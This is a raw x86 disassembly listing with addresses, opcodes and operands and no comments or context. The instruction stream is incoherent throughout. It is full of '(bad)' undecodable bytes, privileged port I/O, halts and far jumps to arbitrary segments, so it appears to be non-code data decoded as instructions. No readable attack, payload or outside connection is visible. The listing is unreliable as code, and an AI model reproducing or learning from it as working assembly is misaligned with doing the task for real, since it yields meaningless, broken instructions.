  41f1b7:	je     0x41f16a
  41f1b9:	div    DWORD PTR [ebp-0x3]
  41f1bc:	inc    ebp
  41f1bd:	imul   edi,DWORD PTR [eax-0x12],0xfffffff3
  41f1c1:	xchg   ecx,eax
  41f1c2:	push   ecx
  41f1c3:	jno    0x41f17d
  41f1c5:	iret   
  41f1c6:	sti    
  41f1c7:	mov    ds:0xcf6139f2,al
  41f1cc:	sbb    al,0x48
  41f1ce:	retf   
  41f1cf:	mov    ds:0xcd0c3c36,al
  41f1d4:	xchg   ebp,eax
  41f1d5:	int    0x8c
  41f1d7:	xor    DWORD PTR ds:[esp+eiz*4],ebx
  41f1db:	ret    0xc934
  41f1de:	jmp    0x2ca6:0x41da7001
  41f1e5:	push   edx
  41f1e6:	rcl    edi,cl
  41f1e8:	push   ebp
  41f1e9:	lds    ebx,FWORD PTR [ecx-0x2076b86e]
  41f1ef:	mov    ah,0x80
  41f1f1:	mov    dl,0xf6
  41f1f3:	jmp    0xbc9b:0x4d71d73a
  41f1fa:	and    esi,DWORD PTR [ebx+0x65]
  41f1fd:	dec    esi
  41f1fe:	je     0x41f184
  41f200:	inc    eax
  41f201:	das    
  41f202:	cmp    ebx,DWORD PTR [ebx-0x73]
  41f205:	cmc    
  41f206:	jbe    0x41f1dc
  41f208:	dec    DWORD PTR [edx+eiz*2-0x768d5ebf]
  41f20f:	test   BYTE PTR [edi-0x44723f16],dl
  41f215:	xchg   edi,eax
  41f216:	cmp    ecx,esi
  41f218:	je     0x41f20b
  41f21a:	or     ch,BYTE PTR [ebp-0x54]
  41f21d:	ret    
  41f21e:	addr16 push eax
  41f220:	jecxz  0x41f241
  41f222:	mov    esp,0xaeb21ef0
  41f227:	ffree  st(4)
  41f229:	loop   0x41f205
  41f22b:	sahf   
  41f22c:	sar    BYTE PTR [ebx+0x36],1
  41f22f:	(bad)  
  41f230:	xor    bh,BYTE PTR [esi+0x3f60dc2e]
  41f236:	outs   dx,DWORD PTR ds:[esi]
  41f237:	lds    esi,FWORD PTR [esi-0x4]
  41f23a:	ins    DWORD PTR es:[edi],dx
  41f23b:	lea    ecx,[esi-0x3a]
  41f23e:	push   cs
  41f23f:	sub    eax,0xe3c3d8d0
  41f244:	jp     0x41f282
  41f246:	push   ebp
  41f247:	(bad)  
  41f248:	retf   0x57ba
  41f24b:	mov    BYTE PTR [ebx-0x4986af76],al
  41f251:	mov    ch,0x56
  41f253:	imul   ebx,esi,0x593254b0
  41f259:	ss int 0xc
  41f25c:	in     al,dx
  41f25d:	fucompp 
  41f25f:	fwait
  41f260:	(bad)  
  41f261:	cmc    
  41f262:	mov    eax,ds:0xd8891200
  41f267:	iret   
  41f268:	and    esi,DWORD PTR es:[edi+0x7ac82ba9]
  41f26f:	or     DWORD PTR [edx+0x711ff44],0xffffff8c
  41f276:	(bad)  [esi]
  41f278:	jecxz  0x41f224
  41f27a:	xor    BYTE PTR [esi+esi*8],bl
  41f27d:	pop    ss
  41f27e:	(bad)  
  41f27f:	jg     0x41f2e3
  41f281:	dec    eax
  41f282:	dec    edi
  41f283:	push   eax
  41f284:	xlat   BYTE PTR ds:[ebx]
  41f285:	mov    ebp,?
  41f287:	pushf  
  41f288:	aam    0x79
  41f28a:	sub    edx,DWORD PTR [esi-0x1b]
  41f28d:	imul   DWORD PTR [ebx+0x168e92c0]
  41f293:	pop    ax
  41f295:	popf   
  41f296:	add    DWORD PTR [ebx-0x6e],ebp
  41f299:	fmul   QWORD PTR [ecx-0x6c06b9f2]
  41f29f:	dec    eax
  41f2a0:	mov    ch,0xd4
  41f2a2:	cmp    BYTE PTR [ebx+edi*4-0x8],0xd2
  41f2a7:	sub    al,0xd3
  41f2a9:	adc    dl,ch
  41f2ab:	sub    esi,esi
  41f2ad:	pop    eax
  41f2ae:	data16 rol BYTE PTR [esi+0x4f177fb4],0xe0
  41f2b6:	adc    eax,0xd23d96d4
  41f2bb:	xor    al,BYTE PTR [esi-0x5677dfca]
  41f2c1:	in     eax,0xf4
  41f2c3:	lea    esi,[eax+0x35ccb252]
  41f2c9:	mov    bl,0x98
  41f2cb:	std    
  41f2cc:	xor    BYTE PTR [edx],ah
  41f2ce:	cmp    ch,BYTE PTR [edx]
  41f2d0:	js     0x41f27d
  41f2d2:	cli    
  41f2d3:	add    BYTE PTR [edx+0x22],0xd9
  41f2d7:	jmp    0x6d3abdf
  41f2dc:	or     eax,ebx
  41f2de:	pop    ecx
  41f2df:	mov    ah,0xe2
  41f2e1:	fsub   st,st(0)
  41f2e3:	mov    ah,0x11
  41f2e6:	sbb    eax,0x4c7a2eda
  41f2eb:	jns    0x41f307
  41f2ed:	into   
  41f2ee:	push   DWORD PTR [edx+eiz*8]
  41f2f1:	and    bh,ah
  41f2f3:	stc    
  41f2f4:	hlt    
  41f2f5:	sub    dl,BYTE PTR [ebx]
  41f2f7:	adc    ebx,DWORD PTR es:[edi+0x79]
  41f2fb:	cld    
  41f2fc:	and    eax,DWORD PTR [ebp-0x61]
  41f2ff:	jg     0x41f301
  41f301:	cwde   
  41f302:	pop    edx
  41f303:	mov    dl,BYTE PTR ds:0xebe0f240
  41f309:	inc    edi
  41f30a:	jecxz  0x41f34c
  41f30c:	dec    esi
  41f30d:	jmp    FWORD PTR [ebp+0xfb505cb]
  41f313:	hlt    
  41f314:	add    al,BYTE PTR [edx-0xe630f89]
  41f31a:	push   0x3b
  41f31c:	cmp    ch,cl
  41f31e:	xchg   DWORD PTR fs:[edx+0x4388cc6f],edx
  41f325:	add    bl,BYTE PTR [edx]
  41f327:	iret   
  41f328:	xchg   ebp,eax
  41f329:	add    ch,ch
  41f32b:	retf   
  41f32c:	daa    
  41f32d:	jns    0x41f2ea
  41f32f:	inc    ebp
  41f330:	mov    ds:0x48c14f35,al
  41f335:	(bad)  
  41f336:	adc    BYTE PTR [ebx+edi*2-0x6e],bh
  41f33a:	sub    dh,BYTE PTR [eax]
  41f33c:	les    esp,FWORD PTR [ebx+0x3c436a1e]
  41f342:	cmp    DWORD PTR [edi],ebx
  41f344:	bound  ebx,QWORD PTR cs:[eax]
  41f347:	(bad)  [ebx+0x5a511ceb]
  41f34d:	or     ch,dh
  41f34f:	stos   DWORD PTR es:[edi],eax
  41f350:	xor    dh,bl
  41f352:	sahf   
  41f353:	call   0x6cb94204
  41f358:	cdq    
  41f359:	pop    ebx
  41f35a:	or     al,0x65
  41f35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f35d:	aas    
  41f35e:	rcl    DWORD PTR [edi],cl
  41f360:	call   0xc376af57
  41f365:	outs   dx,BYTE PTR ds:[esi]
  41f366:	ds idiv edx
  41f369:	and    al,0x30
  41f36b:	jge    0x41f370
  41f36d:	(bad)  
  41f36e:	jnp    0x41f3e0
  41f370:	imul   ebx,DWORD PTR [eax-0x12],0xf14d64c6
  41f377:	mov    ds:0x44ec3573,eax
  41f37c:	addr16 aaa 
  41f37e:	gs das 
  41f380:	pop    ss
  41f381:	dec    BYTE PTR [ebx+0x8]
  41f384:	dec    eax
  41f385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f386:	cdq    
  41f387:	nop
  41f388:	iret   
  41f389:	ret    
  41f38a:	out    dx,al
  41f38b:	ja     0x41f39a
  41f38d:	repnz add esi,DWORD PTR [ebx]
  41f390:	mov    bl,0x2c
  41f392:	jg     0x41f3cd
  41f394:	push   esi
  41f395:	inc    ecx
  41f396:	mov    ebp,0x6e2d228e
  41f39b:	sbb    DWORD PTR [edi-0x2f],edi
  41f39e:	jnp    0x41f3a0
  41f3a0:	jae    0x41f326
  41f3a2:	pusha  
  41f3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3a4:	xchg   ecx,eax
  41f3a5:	out    dx,eax
  41f3a6:	push   edx
  41f3a7:	out    0x72,al
  41f3a9:	pop    esp
  41f3aa:	sbb    DWORD PTR [eax-0x69d6a0ba],eax
  41f3b0:	push   es
  41f3b1:	js     0x41f3f2
  41f3b3:	or     esp,DWORD PTR [edx+0x20]
  41f3b6:	aam    0xbc
  41f3b8:	mov    eax,0x826f792b
  41f3bd:	in     eax,dx
  41f3be:	sbb    al,0xfc
  41f3c0:	loopne 0x41f419
  41f3c2:	mov    ?,WORD PTR [eax+0x6d82763c]
  41f3c8:	cld    
  41f3c9:	mov    edi,0xd1fe0e0c
  41f3ce:	xor    al,0x26
  41f3d0:	cmc    
  41f3d1:	shl    BYTE PTR [eax-0x3e4e76c0],1
  41f3d7:	inc    ecx
  41f3d8:	push   DWORD PTR [esp+eax*1]
  41f3db:	jmp    0x41f3ea
  41f3dd:	pop    eax
  41f3de:	push   es
  41f3df:	pop    esp
  41f3e0:	dec    esp
  41f3e1:	sbb    edx,DWORD PTR [edi-0x40]
  41f3e4:	es ja  0x41f382
  41f3e7:	sub    eax,DWORD PTR [edi-0x5b]
  41f3ea:	or     eax,0x88b45c61
  41f3ef:	or     edx,DWORD PTR [esi]
  41f3f1:	jo     0x41f457
  41f3f3:	mov    edi,0x95e95b60
  41f3f8:	ret    0x5aed
  41f3fb:	(bad)  
  41f3fc:	cli    
  41f3fd:	jecxz  0x41f3fc
  41f3ff:	pop    ebx
  41f400:	pop    esi
  41f401:	add    DWORD PTR [edx-0x63],ebp
  41f404:	lods   al,BYTE PTR ds:[esi]
  41f405:	jge    0x41f451
  41f407:	call   0xfe258658
  41f40c:	xchg   esp,eax
  41f40d:	popf   
  41f40e:	ins    BYTE PTR es:[edi],dx
  41f40f:	add    esp,esp
  41f411:	push   DWORD PTR [ecx+0x6cbd5deb]
  41f417:	ret    0x766d
  41f41a:	push   0x51
  41f41c:	jno    0x41f449
  41f41e:	call   0xad58:0xf8a7b7e8
  41f425:	inc    edx
  41f426:	aaa    
  41f427:	jns    0x41f444
  41f429:	push   eax
  41f42a:	pop    ebx
  41f42b:	loope  0x41f423
  41f42d:	mov    WORD PTR [ebx],ss
  41f42f:	jns    0x41f459
  41f431:	sub    ch,bl
  41f433:	lods   eax,DWORD PTR ds:[esi]
  41f434:	pop    edx
  41f435:	mov    ch,0x7d
  41f437:	mov    esp,0x49b78255
  41f43c:	jl     0x41f404
  41f43e:	and    esi,ecx
  41f440:	imul   esi,DWORD PTR [ebp+ebp*2+0x5],0x941fadfc
  41f448:	dec    ecx
  41f449:	icebp  
  41f44a:	jns    0x41f487
  41f44c:	sti    
  41f44d:	fiadd  WORD PTR [esi+0x72]
  41f450:	pop    ebx
  41f451:	out    dx,al
  41f452:	mov    BYTE PTR [eax-0x4b],ch
  41f455:	js     0x41f414
  41f457:	jae    0x41f48c
  41f459:	or     BYTE PTR [eax],bh
  41f45b:	inc    edi
  41f45c:	dec    edx
  41f45d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f45e:	aas    
  41f45f:	aaa    
  41f460:	stc    
  41f461:	adc    al,0x37
  41f463:	stc    
  41f464:	xor    BYTE PTR [ebx],ah
  41f466:	js     0x41f422
  41f468:	xchg   ebx,eax
  41f469:	arpl   WORD PTR [edx],cx
  41f46b:	adc    edx,DWORD PTR [edi+ecx*8]
  41f46e:	sub    bl,BYTE PTR [eax+eax*8]
  41f471:	scas   eax,DWORD PTR es:[edi]
  41f472:	jecxz  0x41f4bf
  41f474:	jae    0x41f412
  41f476:	imul   edx,DWORD PTR [ecx-0x78],0x49
  41f47a:	hlt    
  41f47b:	fwait
  41f47c:	and    BYTE PTR [edi+0x12],0x1a
  41f480:	nop
  41f481:	pop    edx
  41f482:	pushf  
  41f483:	out    0x7e,al
  41f485:	pop    es
  41f486:	sbb    eax,DWORD PTR [ebx]
  41f488:	push   ebp
  41f489:	stos   BYTE PTR es:[edi],al
  41f48a:	xor    DWORD PTR [ecx+ecx*1+0x2022590f],esp
  41f491:	inc    edx
  41f492:	and    al,0xed
  41f494:	test   DWORD PTR [esi],0x235cc967
  41f49a:	mov    ch,0x55
  41f49c:	add    DWORD PTR [esi],edx
  41f49e:	mov    ebx,0x39cd9e43
  41f4a3:	xchg   edi,eax
  41f4a4:	adc    DWORD PTR [esi],esi
  41f4a6:	adc    BYTE PTR [edi+0x1b],bh
  41f4a9:	mov    edx,0x6b046199
  41f4ae:	add    DWORD PTR ds:0x654e2519,esp
  41f4b4:	in     al,dx
  41f4b5:	or     al,0x2f
  41f4b7:	cli    
  41f4b8:	out    0x0,eax
  41f4ba:	xor    ah,BYTE PTR [esi-0x47]
  41f4bd:	adc    eax,DWORD PTR [eax]
  41f4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4c0:	les    esp,FWORD PTR [esi+0x3e86e141]
  41f4c6:	rcl    DWORD PTR [edx-0x4f],cl
  41f4c9:	sub    ecx,edx
  41f4cb:	add    BYTE PTR [ecx+edi*2+0x767d52a],cl
  41f4d2:	and    al,0xa
  41f4d4:	jns    0x41f51e
  41f4d6:	sbb    cl,BYTE PTR [ebx+edx*1-0x3d27a7a6]
  41f4dd:	inc    edx
  41f4de:	or     eax,0x6171e2e0
  41f4e3:	inc    ebx
  41f4e4:	xchg   esp,eax
  41f4e5:	cdq    
  41f4e6:	retf   0x9f3d
  41f4e9:	sbb    ecx,DWORD PTR [ebx+0x25]
  41f4ec:	jne    0x41f536
  41f4ee:	cmp    al,0x4a
  41f4f0:	shr    DWORD PTR [ebx],0xf9
  41f4f3:	and    esi,DWORD PTR [esi+eiz*1-0x7c]
  41f4f7:	jmp    0x14a6:0x44cd70df
  41f4fe:	mov    bl,0x9f
  41f500:	lods   al,BYTE PTR ds:[esi]
  41f501:	retf   0x45ce
  41f504:	sub    DWORD PTR [esi],edi
  41f506:	inc    ebx
  41f507:	cmp    edi,DWORD PTR [ebp+0xb]
  41f50a:	add    BYTE PTR [eax+0x23],bh
  41f50d:	or     ecx,DWORD PTR [ecx-0x11]
  41f510:	sub    al,0x2a
  41f512:	jb     0x41f4cc
  41f514:	mov    ds:0x6ba77e82,al
  41f519:	data16 xor BYTE PTR [edx+0x6b],bh
  41f51d:	cmp    eax,0x6d12a74c
  41f522:	and    BYTE PTR [ebp-0x56],ah
  41f525:	imul   edi,DWORD PTR [eax+0x73],0x2b7ef6bf
  41f52c:	(bad)  
  41f52e:	push   edi
  41f52f:	xor    eax,0xe244866c
  41f534:	inc    ebx
  41f535:	cmp    BYTE PTR [ebx+0x62f65202],bh
  41f53b:	inc    edi
  41f53c:	mov    eax,ecx
  41f53e:	xchg   BYTE PTR [ebp+0x1a62de0a],ch
  41f544:	pop    eax
  41f545:	adc    edx,ebx
  41f547:	jge    0x41f4fd
  41f549:	lea    ecx,[edx]
  41f54b:	clc    
  41f54c:	dec    ebp
  41f54d:	pop    ebp
  41f54e:	mov    ds:0xbf401cbb,eax
  41f553:	loopne 0x41f594
  41f555:	ss (bad) 
  41f557:	imul   DWORD PTR [ecx+ecx*8]
  41f55a:	mov    BYTE PTR [ecx],al
  41f55c:	jb     0x41f581
  41f55e:	pop    eax
  41f55f:	mov    al,0x92
  41f561:	xor    al,0x5c
  41f563:	jle    0x41f543
  41f565:	fiadd  DWORD PTR fs:[ebx+esi*2-0x5d]
  41f56a:	lds    edx,FWORD PTR [ecx+0x7b]
  41f56d:	jae    0x41f5eb
  41f56f:	ficomp WORD PTR [edi]
  41f571:	dec    ebx
  41f572:	adc    dh,BYTE PTR [esi+0x289ef4ec]
  41f578:	jmp    DWORD PTR [esi+ebx*2+0x2185161c]
  41f57f:	ficomp WORD PTR [edi]
  41f581:	arpl   WORD PTR [esi-0x77179b17],bp
  41f587:	jmp    0x48d80288
  41f58c:	test   BYTE PTR [ecx+0x4034f31f],0xd8
  41f593:	mov    esi,0xc4c7c892
  41f598:	call   0x712:0x1c4d6bc
  41f59f:	(bad)  
  41f5a0:	int    0x52
  41f5a2:	mov    cl,0xfd
  41f5a4:	fist   DWORD PTR [esi-0x39b6664a]
  41f5aa:	fwait
  41f5ab:	rcr    DWORD PTR [eax],cl
  41f5ad:	fisttp WORD PTR [esi+0x5a]
  41f5b0:	cmp    BYTE PTR [ecx+ebp*1],bh
  41f5b3:	xchg   BYTE PTR [esi+0x52],bl
  41f5b6:	int3   
  41f5b7:	or     eax,0x8d64930a
  41f5bc:	(bad)  
  41f5bd:	fidivr WORD PTR [ebx+0x4b]
  41f5c0:	test   BYTE PTR [ebx+0x6c02ea1d],dh
  41f5c6:	in     eax,0x78
  41f5c8:	push   es
  41f5c9:	jns    0x41f59d
  41f5cb:	sar    BYTE PTR [esi+0x6b],1
  41f5ce:	lds    ebx,FWORD PTR [eax+0x6816891e]
  41f5d4:	mov    ds:0xa9a2da05,al
  41f5d9:	mov    dl,0x68
  41f5db:	imul   esi,DWORD PTR [esp+edx*8],0x88ee5e5d
  41f5e2:	sub    ch,ah
  41f5e4:	push   0xc66d27b
  41f5e9:	ret    
  41f5ea:	or     DWORD PTR [eax-0x63],0xd78912dc
  41f5f1:	pop    eax
  41f5f2:	adc    ch,dl
  41f5f4:	and    edx,edx
  41f5f6:	jg     0x41f5c9
  41f5f8:	repnz out 0x67,al
  41f5fb:	and    DWORD PTR [ecx-0x51],0x2d
  41f5ff:	adc    BYTE PTR [eax+0x6],dl
  41f602:	gs aam 0xf2
  41f605:	add    al,0x38
  41f607:	(bad)  
  41f609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f60a:	jle    0x41f5fc
  41f60c:	pop    ebx
  41f60d:	inc    al
  41f60f:	dec    esp
  41f610:	fwait
  41f611:	cmp    DWORD PTR [ecx],esp
  41f613:	push   ds
  41f614:	xchg   esi,eax
  41f615:	shl    dl,cl
  41f617:	and    esi,ebx
  41f619:	dec    ebp
  41f61a:	pop    esp
  41f61b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f61c:	sbb    esi,ecx
  41f61e:	pop    ecx
  41f61f:	mov    cs,esp
  41f621:	shl    BYTE PTR [esi-0x4f],0x49
  41f625:	inc    esp
  41f626:	aaa    
  41f627:	fdiv   DWORD PTR [ebx]
  41f629:	adc    al,0xdf
  41f62b:	dec    edi
  41f62c:	outs   dx,DWORD PTR ds:[esi]
  41f62d:	or     BYTE PTR [esi],0xa5
  41f630:	mov    bh,0xc8
  41f632:	mov    dh,0xd2
  41f634:	cmp    BYTE PTR [esi+0x28],al
  41f637:	and    bh,BYTE PTR [ecx]
  41f639:	neg    DWORD PTR [ebx]
  41f63b:	adc    eax,DWORD PTR [eax+edi*2-0x4e]
  41f63f:	clc    
  41f640:	push   eax
  41f641:	fcmovne st,st(5)
  41f643:	mov    eax,DWORD PTR [esi+0x19]
  41f646:	test   al,0xc7
  41f648:	jg     0x41f623
  41f64a:	xor    eax,0xd1b7c207
  41f64f:	retf   
  41f650:	mov    esp,0x15aee4e9
  41f655:	ret    0xa236
  41f658:	ret    0xed3c
  41f65b:	jge    0x41f613
  41f65d:	retf   0x8b3f
  41f660:	cmp    al,0x7d
  41f662:	jle    0x71d1d578
  41f668:	jmp    0x41f63e
  41f66a:	(bad)  
  41f66b:	shl    BYTE PTR [edi+0x59ef0e2d],1
  41f671:	jbe    0x41f63c
  41f673:	data16 lock jb 0x41f65d
  41f677:	cmp    eax,DWORD PTR [edi-0x7ff41d2a]
  41f67d:	repnz mov cl,0xd7
  41f680:	in     al,dx
  41f681:	ja     0x41f661
  41f683:	xor    BYTE PTR [esi-0x6f],bl
  41f686:	add    al,0x1e
  41f688:	and    ebp,DWORD PTR [edi-0x203c19ac]
  41f68e:	jno    0x41f64b
  41f690:	test   al,0x82
  41f692:	cmp    dl,BYTE PTR [esp+esi*4]
  41f695:	dec    ecx
  41f696:	mov    edi,DWORD PTR [edi-0x730e35f2]
  41f69c:	imul   esi,DWORD PTR [edi],0x511a2d0
  41f6a2:	and    al,0x5f
  41f6a4:	rcr    BYTE PTR [ebx+esi*8+0x4e],0xe3
  41f6a9:	inc    esi
  41f6aa:	fwait
  41f6ab:	mov    edi,0xfcfbd08f
  41f6b0:	jge    0x41f6cd
  41f6b2:	inc    ebx
  41f6b3:	sbb    DWORD PTR [esi],ebx
  41f6b5:	mov    BYTE PTR [edi],bl
  41f6b7:	jb     0x41f68c
  41f6b9:	inc    ebx
  41f6ba:	repnz rol DWORD PTR [edi],cl
  41f6bd:	je     0x41f70e
  41f6bf:	jne    0x41f68b
  41f6c1:	fdiv   st,st(1)
  41f6c3:	pop    edi
  41f6c4:	jecxz  0x41f688
  41f6c6:	and    DWORD PTR [edi+0x8],ecx
  41f6c9:	xchg   ebp,eax
  41f6ca:	xor    edi,DWORD PTR [ecx+0x5240e352]
  41f6d0:	fucomip st,st(0)
  41f6d2:	or     dl,BYTE PTR ds:0xd8378388
  41f6d8:	dec    ecx
  41f6d9:	(bad)  
  41f6da:	clc    
  41f6db:	mov    dl,BYTE PTR [ebp+0x7a04d3a5]
  41f6e1:	in     eax,0x6d
  41f6e3:	hlt    
  41f6e4:	xor    ch,BYTE PTR cs:[ebx-0x639d3962]
  41f6eb:	in     al,0x25
  41f6ed:	jb     0x41f721
  41f6ef:	sub    edi,ebp
  41f6f1:	push   edi
  41f6f2:	xor    BYTE PTR [esi],al
  41f6f4:	mov    al,ds:0x9d13c170
  41f6f9:	int    0xe8
  41f6fb:	out    0xda,eax
  41f6fd:	sahf   
  41f6fe:	jno    0x41f757
  41f700:	fld    TBYTE PTR [edx+0x7a4628c6]
  41f706:	mov    ds:0x736dfb45,eax
  41f70b:	xchg   BYTE PTR [esi+0x3b57902a],dl
  41f711:	jne    0x41f77d
  41f713:	xchg   ebp,eax
  41f714:	ret    
  41f715:	pop    edi
  41f716:	outs   dx,DWORD PTR ds:[esi]
  41f717:	and    ah,dl
  41f719:	push   0xffffffe8
  41f71b:	adc    eax,0x309fb6d5
  41f720:	sti    
  41f721:	push   edi
  41f722:	inc    ebp
  41f723:	pushf  
  41f724:	lock rcl BYTE PTR [ebp+ecx*2+0x7e8cba93],cl
  41f72c:	adc    ch,dl
  41f72e:	data16 repnz add dl,al
  41f732:	sbb    eax,0x4f272c39
  41f737:	push   edx
  41f738:	push   edi
  41f739:	jle    0x41f723
  41f73b:	pop    eax
  41f73c:	test   eax,0x71028bb8
  41f741:	cld    
  41f742:	jmp    0xae92:0x59358581
  41f749:	fs add BYTE PTR fs:[esi-0x80],ah
  41f74e:	cs iret 
  41f750:	aaa    
  41f751:	adc    eax,0x88794059
  41f756:	shl    DWORD PTR [edx-0xe],cl
  41f759:	dec    ebp
  41f75a:	je     0x41f760
  41f75c:	test   al,0xfa
  41f75e:	xchg   DWORD PTR [ebp+0x20],ebx
  41f761:	dec    eax
  41f762:	repnz mov al,0x7f
  41f765:	sbb    BYTE PTR [edi-0xe],0x7b
  41f769:	xchg   ecx,eax
  41f76a:	inc    edx
  41f76b:	(bad)  
  41f76c:	mov    ds:0xbe647596,al
  41f771:	pop    edi
  41f772:	das    
  41f773:	les    eax,FWORD PTR [ebx+0x70]
  41f776:	stos   BYTE PTR es:[edi],al
  41f777:	in     al,dx
  41f778:	mov    edi,0x165f4851
  41f77d:	or     DWORD PTR [edx],edx
  41f77f:	sub    dl,BYTE PTR [ebp-0x4]
  41f782:	mov    dl,0xcc
  41f784:	or     ecx,DWORD PTR [ebp-0x94649ea]
  41f78a:	(bad)  
  41f78b:	(bad)  
  41f78c:	adc    dh,BYTE PTR [eax+eax*1+0x5fc6e9b3]
  41f793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f794:	mov    bh,0x79
  41f796:	cmp    ecx,DWORD PTR [ebp+0x7f]
  41f799:	lods   al,BYTE PTR ds:[esi]
  41f79a:	jae    0x41f723
  41f79c:	daa    
  41f79d:	cmp    ah,BYTE PTR [ebx]
  41f79f:	adc    dh,BYTE PTR [esp+eax*4+0x52]
  41f7a3:	in     eax,0x45
  41f7a5:	inc    ebp
  41f7a6:	or     esp,DWORD PTR [esi+0x6f]
  41f7a9:	sub    ebp,0x4202c710
  41f7af:	adc    BYTE PTR [eax+0x4c48edd2],bh
  41f7b5:	les    edi,FWORD PTR ss:[esi+ecx*1-0x11]
  41f7ba:	xor    edi,eax
  41f7bc:	and    DWORD PTR [eax],esi
  41f7be:	fwait
  41f7bf:	rcr    DWORD PTR [ebx-0x7d],cl
  41f7c2:	mov    ss,WORD PTR [esi]
  41f7c4:	(bad)  [ebx+0x4868a43]
  41f7ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7cb:	add    ebx,0x39
  41f7ce:	push   ebp
  41f7cf:	ja     0x41f767
  41f7d1:	bound  ebx,QWORD PTR [ecx+edx*4]
  41f7d4:	mov    eax,0x195f703c
  41f7d9:	je     0x41f7f8
  41f7db:	cli    
  41f7dc:	(bad)  
  41f7dd:	or     DWORD PTR [esi+eiz*2+0x792dc714],ecx
  41f7e4:	sbb    DWORD PTR ds:0xf3b67149,edx
  41f7ea:	or     bh,BYTE PTR [eax+0x22bd69a4]
  41f7f0:	(bad)  
  41f7f1:	int3   
  41f7f2:	jno    0x41f7fd
  41f7f4:	sbb    esi,DWORD PTR [ebx]
  41f7f6:	rcr    bl,0x65
  41f7f9:	clc    
  41f7fa:	pop    esp
  41f7fb:	xchg   ecx,eax
  41f7fc:	(bad)  
  41f7fd:	sbb    edi,DWORD PTR [edi-0x27]
  41f800:	(bad)  
  41f801:	push   edi
  41f802:	xor    DWORD PTR [eax],esi
  41f804:	mov    dl,0xd5
  41f806:	jg     0x41f85e
  41f808:	je     0x41f868
  41f80a:	mov    cl,0x9a
  41f80c:	xchg   ecx,eax
  41f80d:	adc    esi,ecx
  41f80f:	les    esi,FWORD PTR [ebp-0x7c]
  41f812:	loopne 0x41f84a
  41f814:	mov    WORD PTR [ebx-0x20f4b40c],ss
  41f81a:	js     0x41f853
  41f81c:	lea    ebp,[eax+ebx*1+0x7f]
  41f820:	fadd   DWORD PTR [esi-0x4]
  41f823:	icebp  
  41f824:	sahf   
  41f825:	call   0x343d:0x66565d04
  41f82c:	push   es
  41f82d:	push   ds
  41f82e:	dec    ebp
  41f82f:	lahf   
  41f830:	std    
  41f831:	push   ds
  41f832:	inc    edx
  41f833:	into   
  41f834:	inc    ebx
  41f835:	retf   0x1455
  41f838:	ins    BYTE PTR es:[edi],dx
  41f839:	mov    bl,0xf2
  41f83b:	jmp    0xd65:0x353a1fbc
  41f842:	rol    DWORD PTR [edx-0x2e],cl
  41f845:	adc    DWORD PTR [esi-0x62],ebp
  41f848:	test   al,0x7a
  41f84a:	stc    
  41f84b:	and    ch,0xe3
  41f84e:	push   ss
  41f84f:	inc    ecx
  41f850:	inc    ebp
  41f851:	jle    0x41f843
  41f853:	arpl   WORD PTR [ecx+0x62],ax
  41f856:	imul   edi,ecx,0x5834a99c
  41f85c:	in     eax,0x5
  41f85e:	push   ss
  41f85f:	mov    ah,0x91
  41f861:	leave  
  41f862:	fld    DWORD PTR [edx+0x792c7619]
  41f868:	mov    al,ds:0xb5df9121
  41f86d:	dec    ebp
  41f86e:	int    0xd5
  41f870:	inc    edi
  41f871:	enter  0xa99,0xd0
  41f875:	pop    edx
  41f876:	div    DWORD PTR [ebx]
  41f878:	xchg   esp,eax
  41f879:	loop   0x41f889
  41f87b:	xchg   ebp,eax
  41f87c:	mov    al,BYTE PTR [ebp+edi*4+0x2c]
  41f880:	xor    BYTE PTR [ecx],cl
  41f882:	cmp    eax,edi
  41f884:	fwait
  41f885:	arpl   WORD PTR [ebx-0x60],ax
  41f888:	cmp    al,0x60
  41f88a:	and    DWORD PTR [eax+0x2099266],0xbd73b7a1
  41f894:	mov    bl,0x19
  41f896:	jno    0x41f825
  41f898:	jg     0x41f831
  41f89a:	mov    bl,0x6d
  41f89c:	mov    eax,0xf6878662
  41f8a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8a2:	lds    ecx,FWORD PTR [edi]
  41f8a4:	mov    ecx,0xbba0b420
  41f8a9:	aaa    
  41f8aa:	fldcw  WORD PTR [edx+0x87966b]
  41f8b0:	arpl   di,di
  41f8b2:	scas   al,BYTE PTR es:[edi]
  41f8b3:	adc    BYTE PTR [esp+esi*8],bh
  41f8b6:	ret    
  41f8b7:	fist   WORD PTR [esi-0x11992b83]
  41f8bd:	mov    cl,0xc0
  41f8bf:	les    esp,FWORD PTR [ebp-0x3b2f0b55]
  41f8c5:	jo     0x41f937
  41f8c7:	int3   
  41f8c8:	jnp    0x41f873
  41f8ca:	push   edx
  41f8cb:	mov    al,0xec
  41f8cd:	adc    bh,0x6e
  41f8d0:	sahf   
  41f8d1:	mov    cl,0x56
  41f8d3:	jecxz  0x41f859
  41f8d5:	dec    edi
  41f8d6:	inc    esp
  41f8d7:	pusha  
  41f8d8:	icebp  
  41f8d9:	sub    bl,BYTE PTR ss:[edx-0x5e75b48d]
  41f8e0:	mov    WORD PTR [eax],ds
  41f8e2:	xor    eax,ebp
  41f8e4:	ret    0x4373
  41f8e7:	sub    eax,0xb9ccdbd7
  41f8ec:	test   BYTE PTR [edx-0xf01823d],ch
  41f8f2:	mov    eax,DWORD PTR [esp+eax*2+0x16]
  41f8f6:	pusha  
  41f8f7:	xlat   BYTE PTR ds:[ebx]
  41f8f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8f9:	jp     0x41f8c1
  41f8fb:	shr    dl,0x88
  41f8fe:	ds int 0x3
  41f901:	xor    BYTE PTR [ebx],0x78
  41f904:	inc    esp
  41f905:	lods   al,BYTE PTR ds:[esi]
  41f906:	sub    ecx,ebp
  41f908:	dec    ebp
  41f909:	and    bh,BYTE PTR [esi]
  41f90b:	adc    al,0xe9
  41f90d:	sbb    al,0xd4
  41f90f:	loop   0x41f8ad
  41f911:	cmp    ebp,DWORD PTR [ebx+0x2a]
  41f914:	pop    esi
